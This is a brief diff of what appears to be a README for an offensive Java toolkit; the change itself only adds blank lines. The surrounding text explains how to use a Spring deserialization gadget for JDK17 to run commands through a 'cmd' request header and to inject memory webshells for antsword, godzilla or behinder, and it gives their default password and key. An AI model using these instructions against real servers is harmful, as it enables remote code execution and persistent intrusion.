@@ -70,11 +70,17 @@ https://github.com/whwlsfb/JDumpSpider
 需配置高版本jdk17，直接生成
 
 Gadget用法 :     usage1: SpringBypassJDK17 --- CMD-cmd  --- payload: whoami
+
 usage2: SpringBypassJDK17 --- LF-DefineClassFile --- choose classfile
+
 usage3: SpringBypassJDK17--- MemShell
+
 usage4:  R4gd0ll change no params to run
+
 cmd ---- put header "cmd: whoami"
+
 memshell ---- put header "shell: [antsword|godzilla|behinder]"
+
 pass:123456,key:key
 
 ![image-20251209105354646](images/I-Wanna-Get-All-vFinal/image-20251209105354646.png)
